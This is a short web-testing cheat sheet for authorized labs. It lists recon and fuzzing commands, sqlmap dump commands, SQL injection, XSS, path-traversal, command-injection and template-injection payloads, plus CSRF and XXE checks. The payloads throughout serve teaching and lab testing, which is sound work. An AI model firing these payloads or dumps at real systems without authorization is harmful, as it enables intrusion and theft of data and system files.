# Web Testing

Command and payload reference for authorized web labs.

## Baseline

```bash
curl -i http://target/
whatweb http://target/
nikto -h http://target/
```

## Directory And Parameter Discovery

```bash
gobuster dir -u http://target/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,txt,html,bak,zip
ffuf -u http://target/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
ffuf -u "http://target/page.php?FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
ffuf -u http://target/ -H "Host: FUZZ.domain.local" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs SIZE
```

## SQL Injection

Manual probes:

```text
'
" 
' or 1=1-- -
' OR SLEEP(5)-- -
") OR ("1"="1
```

SQLMap:

```bash
sqlmap -u "http://target/item.php?id=1" --batch --dbs
sqlmap -u "http://target/login.php" --data "user=a&pass=a" --batch --dump
sqlmap -r req.request --level 5 --risk 3 --batch
sqlmap -r req.request --tamper=charunicodeescape --level 5 --risk 3 --batch
```

## XSS

```html
<script>alert(1)</script>
"><svg onload=alert(1)>
"><img src=x onerror=alert(1)>
```

Check reflected parameters, stored profile fields, support tickets, markdown renderers, file names, and admin review workflows.

## LFI And Traversal

```text
../../../../etc/passwd
..%2f..%2f..%2f..%2fetc%2fpasswd
/var/www/html/index.php
/proc/self/environ
/var/log/apache2/access.log
/var/log/nginx/access.log
```

## Command Injection

```text
; id
| id
&& id
$(id)
`id`
```

If spaces are filtered, try `${IFS}` in labs.

## CSRF Checks

- state-changing request has no token
- token can be reused
- token is not tied to the logged-in user
- GET performs sensitive action
- method override bypasses protection

## SSTI

```text
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
```

## SOAP / XXE

Check WSDL, XML imports, SOAPAction, and XML body parsing. Confirm parser behavior with harmless local entities before reading sensitive files in authorized labs.

## Related

- [Web Exploit Path](../guides/Web%20Exploit%20Path.md)
- [Web Attack Alternatives](Web%20Attack%20Alternatives.md)
- [Challenge Use Cases](../references/Challenge%20Use%20Cases.md#web-use-cases)
